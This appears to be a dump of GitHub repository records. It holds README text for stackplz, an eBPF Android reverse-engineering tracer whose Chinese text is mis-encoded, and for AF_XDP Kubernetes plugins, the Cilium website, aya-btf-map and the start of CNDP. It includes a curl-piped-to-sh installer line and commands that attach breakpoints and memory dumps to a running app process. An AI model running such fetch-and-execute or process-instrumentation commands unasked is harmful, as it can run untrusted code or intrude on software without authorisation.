  1349: 000000000007bcf8    68 FUNC    GLOBAL DEFAULT   14 __strchr_chk
   689: 000000000004a8c0   132 FUNC    LOCAL  HIDDEN    14 __strchrnul_aarch64_mte
   692: 000000000004a980   172 FUNC    LOCAL  HIDDEN    14 __strchrnul_aarch64
   695: 000000000004aa40   160 FUNC    LOCAL  HIDDEN    14 __strchr_aarch64_mte
   698: 000000000004ab00   204 FUNC    LOCAL  HIDDEN    14 __strchr_aarch64
  5143: 00000000000b9ee0    32 FUNC    LOCAL  HIDDEN    14 strchr_resolver
  5144: 00000000000b9f00    32 FUNC    LOCAL  HIDDEN    14 strchrnul_resolver
  5550: 00000000000b9ee0    32 GNU_IFUNC GLOBAL DEFAULT   14 strchr
  6253: 000000000007bcf8    68 FUNC    GLOBAL DEFAULT   14 __strchr_chk
  6853: 00000000000b9f00    32 GNU_IFUNC GLOBAL DEFAULT   14 strchrnul
```

# æ–‡ç« 

ä¸ªäººç¢Žç¢Žå¿µå¤ªå¤šï¼Œæœ‰å…³stackplzæ–‡ç« å°±ä¸åŒæ­¥åˆ°æœ¬é¡¹ç›®äº†ï¼Œè¯·ç§»æ­¥åšå®¢æŸ¥çœ‹ï¼š

- [eBPF on Androidä¹‹stackplzä»Ž0åˆ°1](https://blog.seeflower.dev/archives/176/)
- [eBPF on Androidä¹‹stackplzä»Ž0åˆ°1ï¼ˆè¡¥å……ï¼‰æ‰‹æœºä¸ºä½•é‡å¯](https://blog.seeflower.dev/archives/177/)
- [åŸºäºŽeBPFçš„å®‰å“é€†å‘è¾…åŠ©å·¥å…·â€”â€”stackplz](https://blog.seeflower.dev/archives/269/)

ä¹‹å‰é’ˆå¯¹syscallè¿½è¸ªå¹¶èŽ·å–å‚æ•°å•ç‹¬å¼€äº†ä¸€ä¸ªé¡¹ç›®ï¼Œæ•´ä½“ç»“æž„æ›´ç®€å•ï¼Œæ²¡æœ‰interfaceï¼Œæœ‰å…´è¶£è¯·ç§»æ­¥[estrace](https://github.com/SeeFlowerX/estrace)

ä¸è¿‡ç›®å‰`estrace`çš„å…¨éƒ¨åŠŸèƒ½å·²ç»åœ¨stackplzä¸­å®žçŽ°ï¼Œä¸æ—¥å°†å­˜æ¡£

# Ref

æœ¬é¡¹ç›®å‚è€ƒäº†ä»¥ä¸‹é¡¹ç›®å’Œæ–‡ç« ï¼š

- [eCapture(æ—è§‚è€…)](https://github.com/ehids/ecapture)
- [å®šåˆ¶bcc/ebpfåœ¨androidå¹³å°ä¸Šå®žçŽ°åŸºäºŽdwarfçš„ç”¨æˆ·æ€æ ˆå›žæº¯](https://bbs.pediy.com/thread-274546.htm)
- [Simpleperf](https://android.googlesource.com/platform/system/extras/+/master/simpleperf/doc/README.md)
- [Tracee](https://github.com/aquasecurity/tracee)
- [bpftrace](https://github.com/iovisor/bpftrace)

---

# wbstack

```bash
./wbstack_arm64 -p `pidof com.sfx.ebpf` --brk 0x6dd9d563a4:x --stack
```

```bash
./wbstack_arm64 -p `pidof com.sfx.ebpf` --brk 0x6dd9d563a4:x -w 0x0[str,ptr,buf:32:x0] --color --dumphex
```

```bash
./wbstack_arm64 -p `pidof com.sfx.ebpf` --brk 0xF3A4:x --brk-lib libnative-lib.so -w 0x0[str,ptr,buf:32:x0] --color --dumphex --stack
```

```bash
./wbstack_arm64 -p `pidof com.sfx.ebpf` --brk 0xF3A4:x --brk-lib libnative-lib.so -w 0x0[str,ptr,buf:32:x0] --color --dumphex --stack --jstack --kill SIGSTOP
```"
intel/afxdp-plugins-for-kubernetes,45,13,45,14,Go,,2022-03-29T20:20:56Z,2025-09-19T11:04:18Z,409,"Please click on the below URL for continued interest on this project's development.

 https://github.com/redhat-et/afxdp-plugins-for-kubernetes

PROJECT NOT UNDER ACTIVE MANAGEMENT

This project will no longer be maintained by Intel.

Intel has ceased development and contributions including, but not limited to, maintenance, bug fixes, new releases, or updates, to this project.

Intel no longer accepts patches to this project.

If you have an ongoing need to use this project, are interested in independently developing it, or would like to maintain patches for the open source software community, please create your own fork of this project.

Contact: webadmin@linux.intel.com


[![GitHub Super-Linter](https://github.com/intel/afxdp-plugins-for-kubernetes/actions/workflows/public-ci.yml/badge.svg?branch=main)](https://github.com/marketplace/actions/super-linter) ![CodeQL](https://github.com/intel/afxdp-plugins-for-kubernetes/actions/workflows/codeql.yml/badge.svg?branch=main)  [![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/intel/afxdp-plugins-for-kubernetes/badge)](https://api.securityscorecards.dev/projects/github.com/intel/afxdp-plugins-for-kubernetes) [![Go Report Card](https://goreportcard.com/badge/github.com/intel/afxdp-plugins-for-kubernetes)](https://goreportcard.com/report/github.com/intel/afxdp-plugins-for-kubernetes) [![Go Reference](https://pkg.go.dev/badge/github.com/intel/afxdp-plugins-for-kubernetes.svg)](https://pkg.go.dev/github.com/intel/afxdp-plugins-for-kubernetes)

# AF_XDP Plugins for Kubernetes

A Kubernetes device plugin and CNI plugin to provide AF_XDP networking to Kubernetes pods.

## Deploy the Plugins

Assuming you have a functional Kubernetes cluster and environment as described in the [prerequisites](#running-the-plugins), the plugins can be deployed with the following command: `kubectl apply -f https://raw.githubusercontent.com/intel/afxdp-plugins-for-kubernetes/main/deployments/daemonset.yml`

This will deploy the daemonset with the default configuration described in [deployments/daemonset.yml](./deployments/daemonset.yml).
Alternatively, to customize the configuration:

- Download daemonset.yaml: `wget https://raw.githubusercontent.com/intel/afxdp-plugins-for-kubernetes/main/deployments/daemonset.yml`
- Update daemonset.yml with the required configuration. See the [Device Plugin Config](#device-plugin-config) section.
- Deploy the plugins with the updated config: `kubectl create -f daemonset.yml`

## Running AF_XDP Pods

- Create a network attachment definition file. This is the config for the CNI plugin.
  - An example file can be found under [examples/network-attachment-definition.yaml](./examples/network-attachment-definition.yaml)
  - Change the config if necessary. See comments in the example file.
  - `kubectl create -f network-attachment-definition.yaml`
- Create a pod spec:
  - An example pod spec can be found under [examples/pod-spec.yaml](./examples/pod-spec.yaml)
  - Configure the pod spec to use a suitable Docker image and to reference the network attachment definition as well as the resource type from the Device Plugin. See comments in the example file.
  - `kubectl create -f pod-spec.yaml`

## Prerequisites

### Running the Plugins

The following prerequisites are required to run the plugins:

- **OS**
  - Any OS that supports Kubernetes should work.
  - Tested on Ubuntu 20.04.
- **Kernel**
  - AF_XDP support started from Linux kernel 4.18.
- **Docker (or more recently Podman)**
  - All recent versions should work.
  - Tested on `20.10.5`, `20.10.7`, `20.10.12`, `20.10.14`, `20.10.18`.
  - **Note:** You may need to disable memlock on Docker.
  Add the following section to `/etc/docker/daemon.json`:

    ```yaml
    ""default-ulimits"": {
    ""memlock"": {
        ""Name"": ""memlock"",
        ""Hard"": -1,
        ""Soft"": -1
        }
    }
    ```

    Restart the Docker service: `systemctl restart docker.service`
- **Kubernetes**
  - All recent versions should work.
  - Tested on `1.20.2`, `1.21.1`, `v1.22.4`, `v1.22.8`, `v1.23.0`, `v1.23.5`.
- **A CNI network**
  - To serve as the [default network](https://github.com/k8snetworkplumbingwg/multus-cni/blob/master/docs/quickstart.md#key-concepts) to the Kubernetes pods.
  - Any CNI should work. Tested with [Flannel](https://github.com/flannel-io/flannel).
- **Multus CNI**
  - To enable attaching of multiple network interfaces to pods.
  - [Multus quickstart guide](https://github.com/k8snetworkplumbingwg/multus-cni/blob/master/docs/quickstart.md).
- **Kind**
  - To use a Kind deployment.
  - [Kind quickstart guide](https://kind.sigs.k8s.io/docs/user/quick-start/)
  - Tested with Kind version 0.18.0
  - **Note:** For kind, please also install [**kubeadm**](https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/)

### Development Prerequisites

The following prerequisites are required to build and deploy the plugins from source:

- **GoLang**
  - To build the plugin binaries.
  - All recent versions should work.
  - Tested on `1.13.8`, `1.15.15`, `1.17`, `1.17.1`, `1.17.8`, `1.18`, `1.19`.
  - [Download and install](https://golang.org/doc/install).
- **Libbpf**
  - To load and unload the XDP program onto the network device.
  - Install on Ubuntu 20.10+: `apt install libbpf-dev`
  - Older versions: [Install from source](https://github.com/libbpf/libbpf#build).
- **GCC Compiler**
  - To compile the C code used to call on the BPF Library.
  - Install on Ubuntu: `apt install build-essential`
- **Binutils**
  - Used in archiving of C code object file.
  - Install on Ubuntu: `apt install binutils`
- **Clang**
  - Compiling the bpf progs for Kind.
  - Install on Ubuntu: `apt install clang`
- **gcc-multilib**
  - Compiling the bpf progs for Kind.
  - Install on Ubuntu: `apt install gcc-multilib`
- **llvm**
  - Compiling the bpf progs for Kind.
  - Install on Ubuntu: `apt install llvm`

### Static analysis, linting and formatting

The following static analysis, linting and formatting tools are not required for building and deploying but are built into some of the Make targets and enforced by CI. It is recommended to have these installed on your development system.

- **[GoFmt](https://pkg.go.dev/cmd/gofmt)**
  - Applies standard formatting to Go code.
  - Supplied with GoLang.
- **[Go Vet](https://pkg.go.dev/cmd/vet)**
  - Examines Go source code and reports suspicious constructs.
  - Supplied with GoLang.
- **[GolangCI-Lint](https://golangci-lint.run/)**
  - A Go linters aggregator.
  - Install: `curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sh -s -- -b $(go env GOPATH)/bin v1.42.1`
- **[Hadolint](https://github.com/hadolint/hadolint)**
  - A Dockerfile linter that helps build best practice into Docker images.
  - Runs in Docker container.
- **[Shellcheck](https://github.com/koalaman/shellcheck)**
  - A static analysis tool for shell scripts.
  - Install on Ubuntu: `apt install shellcheck`
- **[Clang Format](https://clang.llvm.org/docs/ClangFormat.html)**
  - Applies standard formatting to C code.
  - Install on Ubuntu: `apt install clang-format`
- **[CLOC](https://github.com/AlDanial/cloc)**
  - Count Lines Of Code, counts lines of code in many programming languages.
  - Install on Ubuntu: `apt install cloc`
- **[Staticcheck](https://staticcheck.io/docs/getting-started/)**
  - Static analysis tool used to perform debugging, identify performance issues, style rules and highlights code simplifications.
  - Golang package which requires go environment `go install honnef.co/go/tools/cmd/staticcheck@latest`
- **[Trivy](https://github.com/aquasecurity/trivy)**
  - A comprehensive and versatile security scanner.
  - [Install on Ubuntu](https://aquasecurity.github.io/trivy/v0.38/getting-started/installation/):

    ```bash
    sudo apt-get install wget apt-transport-https gnupg lsb-release
    wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | gpg --dearmor | sudo tee /usr/share/keyrings/trivy.gpg > /dev/null
    echo ""deb [signed-by=/usr/share/keyrings/trivy.gpg] https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main"" | sudo tee -a /etc/apt/sources.list.d/trivy.list
    sudo apt-get update
    sudo apt-get install trivy
    ```

## Build and Deploy from Source

- Clone this repo and `cd` into it.
- Optional: Update configuration. See [Device Plugin Config](#device-plugin-config).
- Run `make deploy`.

The following steps happen **automatically**:

1. `make build` is executed, resulting in CNI and Device Plugin binaries in `./bin`.
2. `make image` is executed, resulting in the creation of a new Docker image that includes the CNI and Device Plugin binaries.
    > **_NOTE:_** If testing on a multi-node cluster. The current absence of a Docker registry means this image will first need to be manually copied to all nodes (or rebuilt on all nodes using: `make image`).*
3. The daemonset will run on all nodes, installing the CNI and starting the Device Plugin running on each node.

The CNI and Device Plugin are now deployed.

## Deploying on Kind

- Clone this repo and `cd` into it.
- Optional: Update the Kind configuration files: `hack/kind-config.yaml` and `deployments/daemonset-kind.yaml`.
- Run `make run-on-kind`.

This will deploy a kind cluster with a control plane and two worker nodes. It will build and run the DP daemonset, and install the CNI on all nodes.

### Running Pods

- Create a network attachment definition file. This is the config for the CNI plugin.
  - An example file can be found under [examples/network-attachment-definition.yaml](./examples/network-attachment-definition.yaml)
  - Change the config if necessary. See comments in the example file.
  - `kubectl create -f network-attachment-definition.yaml`
- Create a pod spec:
  - An example pod spec can be found under [examples/kind-pod-spec.yaml](./examples/kind-pod-spec.yaml)
  - Configure the pod spec to use a suitable Docker image and to reference the network attachment definition as well as the resource type from the Device Plugin. See comments in the example file.
  - `kubectl create -f kind-pod-spec.yaml`

> **_NOTE:_** With kind, you will need to give the pods CAP_BPF privilege UNLESS you run the following commands: `docker exec <node-name> sudo sysctl kernel.unprivileged_bpf_disabled=0`. Where node names are: af-xdp-deployment-worker and af-xdp-deployment-worker2.

## Device Plugin Config

Under normal circumstances the device plugin config is set as part of a config map at the top of the [daemonset.yml](./deployments/daemonset.yml) file.

The device plugin binary can also be run manually on the host for development and testing purposes. In these scenarios the device plugin will search for a `config.json` file in its current directory, or the device plugin can be pointed to a config file using the `-config` flag followed by a filepath.

In both scenarios, daemonset deployment or manually running the binary, the structure of the config is identical JSON format.

### Pools

The device plugin has a concept of device pools. Devices in this case being network devices, netdevs. The device plugin can simultaneously have multiple pools of devices. Different pools can have different configurations to suit different use cases. Devices can be added/configured to the pool in a few different ways, explained below.
Pools have two required fields, a **name** and a **mode**.

The **name** is the unique name used to identify a pool. The name is used in the pod spec to request devices from this pool. For example, if a pool is named `myPool`, any pods requiring devices from this pool will request resources of type `afxdp/myPool`.

The **mode** is the mode this pool operates in. Mode determines how pools scale and there are currently two accepted modes - `primary` and `cdq`. Primary mode means there is no scaling, the AF_XDP pod is provided with the full NIC port (the primary device). CDQ mode means that subfunctions will be used to scale the pool, so pods each get their own secondary device (a subfunction) meaning many pods can share a primary device (NIC port).
Additional secondary device modes are planned.

The example below shows how to configure two pools in different modes.

> **_NOTE:_**  Currently, CDQ is not publicly available yet, but will be in the future.
```yaml
{
   ""pools"":[
      {
         ""name"": ""myCdqPool"",
         ""mode"": ""cdq""
      },
      {
         ""name"": ""myPrimarypool"",
         ""mode"": ""primary""
      }
   ]
}
```

> **_NOTE_1:_** that the above is not a fully working example as the pools have not yet been configured with devices. This will not pass the device plugin's config validation.

> **_NOTE_2:_** Each pool created will require its own network attachment definition. See the [Running Pods](#running-pods) section above and the [network-attachment-definition.yaml](./examples/network-attachment-definition.yaml) example file for more info. The resource name provided as `k8s.v1.cni.cncf.io/resourceName` must match the pool name.

### Pool Drivers

In production environments, the most common way to add devices to a pool is through configuring drivers for that pool. When a driver is configured to a pool, the device plugin will search the node for devices using this driver and add them to that pool. A pool can have multiple drivers associated with it. Drivers are identified by their name.

The example below shows how to configure a single pool that is associated with two drivers.

```yaml
{
   ""pools"":[
      {
         ""name"": ""myPool"",
         ""mode"": ""primary"",
         ""drivers"":[
            {
               ""name"": ""i40e""
            },
            {
               ""name"": ""ice""
            }
         ]
      }
   ]
}

```

In the example above the device plugin will assign all devices of driver type `i40e` and `ice` to the pool `myPool`. The following explains how to add optional configurations that will limit the devices assigned per driver:

- The **primary** field is an integer and it sets the maximum number of primary devices this pool will take, per node.
- The **secondary** field is an integer and, if the pool is in a secondary device mode such as cdq, sets the maximum number of secondary devices this pool will create, per primary device.
- The **excludeDevices** field is an array of devices. Any primary device identified in this array will **not** be added to the pool. See [Pool Devices](#pool-devices) for more info on identifying devices.
- The **excludeAddressed** field is a boolean and, if true, does **not** add any device with an IPv4 address to the pool.

In the example below a single pool is given the **name** `myPool`. The pool **mode** is `cdq`, meaning the device plugin will create subfunctions on top of the primary devices. To add primary devices to the pool the **drivers** field is used. In this case a single driver is identified by its **name**, `ice`, meaning the pool will be assigned primary devices that"
cilium/cilium.io,50,106,50,13,JavaScript,Cilium project website,2022-01-19T11:35:18Z,2025-10-10T10:11:28Z,1860,"# Cilium Website

<div align=""center"">
  <picture>
    <source media=""(prefers-color-scheme: light)"" srcset=""https://cdn.jsdelivr.net/gh/cilium/cilium@main/Documentation/images/logo.png"">
    <img src=""https://cdn.jsdelivr.net/gh/cilium/cilium@main/Documentation/images/logo-dark.png"" width=""350"" alt=""Cilium Logo"">
  </picture>
</div>

<!-- Horizontal badges -->
<p align=""center"">
  <a href=""https://cilium.io"">
    <img src=""https://img.shields.io/badge/Website-cilium.io-blue?style=for-the-badge"">
  </a>
  <a href=""https://docs.cilium.io/en/stable/"">
    <img src=""https://img.shields.io/badge/Docs-docs.cilium.io-green?style=for-the-badge"">
  </a>
  <a href=""https://github.com/cilium/cilium"">
    <img src=""https://img.shields.io/badge/GitHub-cilium/cilium-black?style=for-the-badge&logo=github"">
  </a>
  <a href=""https://slack.cilium.io/"">
    <img src=""https://img.shields.io/badge/Slack-Join%20Community-purple?style=for-the-badge&logo=slack"">
  </a>
  <a href=""https://www.youtube.com/c/eBPFCiliumCommunity/"">
    <img src=""https://img.shields.io/badge/YouTube-eBPF%20%26%20Cilium-red?style=for-the-badge&logo=youtube"">
  </a>
</p>

---

## Table of Contents

- [Cilium Website](#cilium-website)
  - [Table of Contents](#table-of-contents)
  - [Contributing](#contributing)
  - [Getting Started](#getting-started)
  - [Usage](#usage)
    - [Run the website](#run-the-website)
    - [Build the website](#build-the-website)
    - [Run the built website](#run-the-built-website)
    - [Clean Gatsby cache](#clean-gatsby-cache)
  - [Project Structure](#project-structure)
  - [Component Folder Structure](#component-folder-structure)
    - [Each component includes](#each-component-includes)
    - [Each component optionally may include](#each-component-optionally-may-include)
    - [Example structure](#example-structure)
  - [Code Style](#code-style)
    - [ESLint](#eslint)
    - [Prettier](#prettier)
    - [VS Code](#vs-code)
    - [Development Commands](#development-commands)
  - [How to create blog post](#how-to-create-blog-post)

## Contributing

Please see [Contributing](CONTRIBUTING.md) for guidelines on adding blogs, documentation, Cilium distributions and trainings, or any other content to the website.

## Getting Started

1. Fork this repository and clone the forked one

```bash
git clone git@github.com:<your-handle>/cilium.io.git
```

2. Install dependencies

```bash
npm install
```

3. Copy .env.example and rename it into .env

```bash
cp .env.example .env
```

**Note:** This project includes a Makefile with all the development commands.

You can quickly set up the project using:

```bash
make env     # Setup environment file
make install # Install dependencies
make start   # Start the development server
```

Explore the [Development Commands](#development-commands) section for more available options.

## Usage

### Run the website

```bash
npm run start
```

> **Note:** If you encounter the error:
>
> ```
> FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory
> ```
>
> This happens because Node.js has a default memory limit (usually around 4 GB), which may not be sufficient for memory intensive tasks such as image processing in Gatsby.
>
> To fix this, increase the memory limit by running the following command:
>
> **Linux/macos**:
>
> ```bash
> NODE_OPTIONS=""--max-old-space-size=8192"" npm run start
> ```
>
> **Windows**:
>
> ```powershell
> $env:NODE_OPTIONS=""--max-old-space-size=8192""
> npm run start
> ```
>
> This allows Node.js to use up to 8 GB of RAM. You can adjust the number (`8192`) if needed based on your system capacity.
>
> **Tip for laptops without fans** (e.g., MacBook Air):  
> To reduce heat and memory usage during development, you can limit Gatsby to fewer CPU cores:
>
> ```bash
> GATSBY_CPU_COUNT=2 npm run develop
> ```

### Build the website

```bash
npm run build
```

### Run the built website

```bash
npm run serve
```

### Clean Gatsby cache

```bash
npm run clean
```

## Project Structure

```text
â”œâ”€â”€ src
â”‚   â”œâ”€â”€ components
â”‚   â”‚  â”œâ”€â”€ pages â€” React components that are being used specifically on a certain page
â”‚   â”‚  â””â”€â”€ shared â€” React components that are being used across the whole website
â”‚   â”œâ”€â”€ hooks
â”‚   â”œâ”€â”€ images â€” Images that are being quired using graphql. Read more about it here â€” gatsbyjs.org/docs/working-with-images. Also note, that folder structure should be equal to the structure of components folder
â”‚   â”œâ”€â”€ pages
â”‚   â”œâ”€â”€ styles
â”‚   â”œâ”€â”€ templates
â”‚   â”œâ”€â”€ utils
â”‚   â””â”€â”€ html.js â€” HTML template for all generated pages. Read more about it here â€” gatsbyjs.org/docs/custom-html
â”œâ”€â”€ static
â”‚   â””â”€â”€ fonts - Self-hosted fonts
â”œâ”€â”€ gatsby-browser.js â€” This file is where Gatsby expects to find any usage of the Gatsby browser APIs (if any). These allow customization/extension of default Gatsby settings affecting the browser. Read more about it here â€” gatsbyjs.org/docs/browser-apis
â”œâ”€â”€ gatsby-config.js â€” This is the main configuration file for a Gatsby site. This is where you can specify information about your site (metadata) like the site title and description, which Gatsby plugins youâ€™d like to include, etc. Read more about it here â€” gatsbyjs.org/docs/gatsby-config
â”œâ”€â”€ gatsby-node.js â€” This file is where Gatsby expects to find any usage of the Gatsby Node APIs (if any). These allow customization/extension of default Gatsby settings affecting pieces of the site build process. Read more about it here â€” gatsbyjs.org/docs/node-apis
â””â”€â”€ gatsby-ssr.js â€” This file is where Gatsby expects to find any usage of the Gatsby server-side rendering APIs (if any). These allow customization of default Gatsby settings affecting server-side rendering. Read more about it here â€” gatsbyjs.org/docs/ssr-apis
```

## Component Folder Structure

### Each component includes

1. Main JavaScript File
2. Index File

### Each component optionally may include

1. Folder with icons and images

Also, each component may include another component that follows all above listed rules.

### Example structure

```bash
component
â”œâ”€â”€ nested-component
â”‚  â”œâ”€â”€ images
â”‚  â”‚  â”œâ”€â”€ image.png
â”‚  â”‚  â””â”€â”€ icon.svg
â”‚  â”œâ”€â”€ nested-component.jsx
â”‚  â””â”€â”€ index.js
â”œâ”€â”€ images
â”‚  â”œâ”€â”€ image.png
â”‚  â””â”€â”€ icon.svg
â”œâ”€â”€ component.jsx
â””â”€â”€ index.js
```

## Code Style

### ESLint

[ESLint](https://eslint.org/) helps find and fix code style issues and force developers to follow same rules. Current configuration is based on [Airbnb style guide](https://github.com/airbnb/javascript).

Additional commands:

```bash
npm run lint
```

Run it to check the current status of eslint issues across project.

```bash
npm run lint:fix
```

Run it to fix all possible issues.

### Prettier

[Prettier](https://prettier.io/) helps to format code based on defined rules. [Difference between Prettier and ESLint](https://prettier.io/docs/en/comparison.html).

Additional commands:

```bash
npm run format
```

Run it to format all files across the project.

### VS Code

Following extensions required to simplify the process of keeping the same code style across the project:

- [ESLint](https://marketplace.visualstudio.com/items?itemName=dbaeumer.vscode-eslint)
- [Prettier](https://marketplace.visualstudio.com/items?itemName=esbenp.prettier-vscode)

After installation enable ""ESLint on save"" by adding to your VS Code settings.json the following line:

```json
""editor.codeActionsOnSave"": {
    ""source.fixAll.eslint"": true
}
```

You can navigate to settings.json by using Command Pallete (CMD+Shift+P) and then type ""Open settings.json"".

To enable Prettier go to Preferences -> Settings -> type ""Format"". Then check that you have esbenp.prettier-vscode as default formatter, and also enable ""Format On Save"".

Reload VS Code and auto-format will work for you.

### Development Commands

This project uses a Makefile to simplify common tasks. Below are the available commands:

```bash
make install       # Install dependencies
make env           # Setup environment file (.env)
make start         # Start dev server (fast, skips image processing)
make start-full    # Start dev server (full build with image processing)
make build         # Build the site for production
make serve         # Serve production build locally
make clean         # Clean Gatsby cache
make lint          # Run ESLint linter
make lint-fix      # Fix ESLint issues

make docker-build   # Build the Docker image
make docker-run     # Run the project inside Docker (production mode)
make docker-run-dev # Run the project inside Docker (development mode with hot reload)
make docker-shell   # Open a shell inside the Docker container
```

## How to create blog post

The blog is created using `gatsby-source-filesystem` plugin and `gatsby-plugin-mdx` along with the createPages Gatsby Node API. The blog is configured to dynamically create pages with `.md` files from `src/posts/`.

In `.md` files we can declare frontmatter at the beginning:

- path: the path of blog post;
- date: the publish date of blog post;
- title: the title of blog post;
- isPopular: the boolean value that defines posts in block `Popular posts`;
- isFeatured: the boolean value that defines the post in block `Featured Story`
  (NOTE: featured post can be only 1);
- draft: the boolean value that defines the post is still in the process of being written. (it's false by default, if it's true, the post will not be rendered on production, but only on localhost);
- categories: the categories of blog post;
- tags: the tags of blog post, which is displayed in Twitter share card;
- ogImage: the og:image in SEO metadata, also it is the cover image, which is displayed in the blog post card (featured story, popular posts);
- ogSummary: the og:description in SEO metadata, also it is the description text, which is displayed in the blog post card (featured story, popular posts).
- externalUrl: the external blog post url
- ogImageUrl: the image url for the og:image in SEO metadata (use for the external blog posts)

The preview tags in `.md` files (which is used in the old Cilium blog) are fully converted to `ogImage` and `ogSummary` in `frontmatter`.

```markdown
---
path: ""/blog/2021/10/13/cilium-joins-cncf""
date: ""2021-10-13T17:00:00.000Z""
title: ""Cilium joins the CNCF""
isPopular: true
isFeatured: false
draft: false
ogImage: cilium-cncf-card.png
ogSummary: ""CNCF TOC chair Liz Rice explains why she's excited about the future of
Cilium as an Incubation project in the CNCF."" 
categories:
  - Technology
  - Community
tags:
  - eBPF
  - BPF
  - Cilium
  - CNCF
---

import authors from 'utils/author-data.js';

![Cilium joins the CNCF](cilium-cncf-card.png)

I'm beyond thrilled that Cilium has joined the CNCF as an Incubation project!
I'm excited about it not just as an advocate for the Cilium project, but also as
an Isovalent team member, and in my role as Chair of the CNCF's Technical
Oversight Committee - and I'd like to share why.
```

In `.md` files, it's able to use the custom component `Blog Author` and pass `header`, `bio` as props to the component.
For example:

```markdown
<BlogAuthor
header=""Thomas Graf""
bio={`Thomas Graf is a Co-Founder of Cilium and the CTO & Co-Founder of <a href=""https://isovalent.com"">Isovalent</a>, the company behind Cilium. Before that, Thomas spent 15 years as a kernel developer working on the <a href=""https://kernel.org"">Linux kernel</a> in networking, security and eventually eBPF.`}
/>
```

Or you can import the author data in `.md` files from `src/utils/author-data.js`:

```markdown
import authors from 'utils/author-data';

<BlogAuthor {...authors.thomasGraf}/>
```

The default theme of Blog Author is `primary`.

If you want to use another theme, pass the prop `theme` with value `secondary`:

```markdown
<BlogAuthor
theme=""secondary""
header=""Guest Blog Post:""
bio={`This is a guest blog by a Cilium user based on the <a href=""https://davidlovezoe.club/wordpress/archives/851"">the original blog post</a>. If you would like to publish a blog post as well, contact us on Slack.`}
/>
```
"
vadorovsky/aya-btf-map,6,1,6,0,Rust,BTF map support for Aya,2023-01-27T02:17:44Z,2024-02-12T03:30:19Z,12,"# aya-btf-map

**Experimental** BTF map support for Aya. Requires using custom LLVM and#
bpf-linker builds.

This crate provides macros and structures for eBPF programs for using BTF maps
[[1]](https://github.com/libbpf/libbpf/issues/355)
[[2]](https://lwn.net/Articles/790177/) instead of
[legacy BPF maps](https://github.com/libbpf/libbpf/wiki/Libbpf:-the-road-to-v1.0#drop-support-for-legacy-bpf-map-declaration-syntax)
currently supported by the main [aya-bpf](https://github.com/aya-rs/aya/tree/main/bpf/aya-bpf)
crate.

Using this crate allows to emit the BTF debug info for your eBPF programs
written in Rust.

## Prerequisites

### LLVM (with custom patches)

You need to use [this fork and branch of LLVM](https://github.com/vadorovsky/llvm-project/tree/bpf-fixes).

After you clone it somewhere and enter its directory, build LLVM with the
following commands:

WARNING! This example with debug build requires at least 32 GB RAM to build in
reasonable time.

```
mkdir build
cd build

CC=clang CXX=clang++ cmake -DCMAKE_BUILD_TYPE=Debug -DLLVM_PARALLEL_LINK_JOBS=1 -DLLVM_ENABLE_LLD=1 -DLLVM_BUILD_LLVM_DYLIB=1 -GNinja ../llvm/
ninja
```

`LLVM_PARALLEL_LINK_JOBS` ensures that linking is done with only 1 core. Using
lld and clang(++) makes the build faster.

If you encounter any problems with OOM killer or your machine being unusable,
you can trim down the number of ninja threads:

```
ninja -j[number_of_threads]
```

It's also helpful to resize the Swap to match your RAM size and use above command with ``` -l 1 ``` to reduce overhead on the CPU usage because of expensive linking. That way the build is parallel with sequential linking.

If you still have problems or have less than 64GB, try a release build:

```
CC=clang CXX=clang++ cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_PARALLEL_LINK_JOBS=1 -DLLVM_ENABLE_LLD=1 -GNinja ../llvm/
ninja
```
### bpf-linker (with custom patches)

You need to use [this fork and branch of bpf-linker](https://github.com/vadorovsky/bpf-linker/tree/fix-di).

After cloning and entering the directory, we need to install bpf-linker with
*system-llvm* feature and point to the patched build with `LLVM_SYS_160_PREFIX`
variable:

```
LLVM_SYS_160_PREFIX=[path_to_your_llvm_repo]/build cargo install --path . --no-default-features --features system-llvm bpf-linker
```

For example:

```
LLVM_SYS_160_PREFIX=/home/vadorovsky/repos/llvm-project/build cargo install --path . --no-default-features --features system-llvm bpf-linker
```

## Example

Example of a simple eBPF program using a BTF hash map:

```rust
#![no_std]
#![no_main]

use aya_bpf::{cty::c_long, macros::tracepoint, programs::TracePointContext};
use aya_btf_map::{macros::btf_map, HashMap};

#[btf_map]
static mut PID_MAP: HashMap<i32, i32, 1024> = HashMap::new();

#[tracepoint(name = ""fork"")]
pub fn fork(ctx: TracePointContext) -> u32 {
    match try_fork(ctx) {
        Ok(ret) => ret,
        Err(ret) => ret as u32,
    }
}

fn try_fork(ctx: TracePointContext) -> Result<u32, c_long> {
    // Load the pointer to the filename. The offset value can be found running:
    // sudo cat /sys/kernel/debug/tracing/events/sched/sched_process_fork/format
    const PARENT_PID_OFFSET: usize = 24;
    const CHILD_PID_OFFSET: usize = 44;
    let parent_pid: i32 = unsafe { ctx.read_at(PARENT_PID_OFFSET)? };
    let child_pid: i32 = unsafe { ctx.read_at(CHILD_PID_OFFSET)? };

    unsafe { PID_MAP.insert(&parent_pid, &child_pid, 0)? };

    Ok(0)
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
```

aya-btf-map needs to be added as a dependency in `Cargo.toml`:

```
[dependencies]
aya-bpf = { git = ""https://github.com/aya-rs/aya"", branch = ""main"" }
[...]
aya-btf-map = { git = ""https://github.com/vadorovsky/aya-btf-map"", branch = ""main"" }
```

## Screenshots

![aya-btf-maps](https://raw.githubusercontent.com/vadorovsky/aya-btf-map/main/assets/aya-btf-map.png)

![btf-dump](https://raw.githubusercontent.com/vadorovsky/aya-btf-map/main/assets/btf-dump.png)

![objdump](https://raw.githubusercontent.com/vadorovsky/aya-btf-map/main/assets/objdump.png)
"
CloudNativeDataPlane/cndp,94,34,94,28,C,Cloud Native Data Plane (CNDP) is a collection of user space libraries to accelerate packet processing for cloud applications using AF_XDP sockets as the primary I/O..,2022-04-14T16:59:54Z,2025-09-29T18:12:08Z,482,"# CNDP - Cloud Native Data Plane

![Smoke Test](https://img.shields.io/github/actions/workflow/status/CloudNativeDataPlane/cndp/smoke.yml?label=smoke-test)
![cppcheck](https://img.shields.io/github/actions/workflow/status/CloudNativeDataPlane/cndp/cppcheck.yaml?branch=main&label=CI)
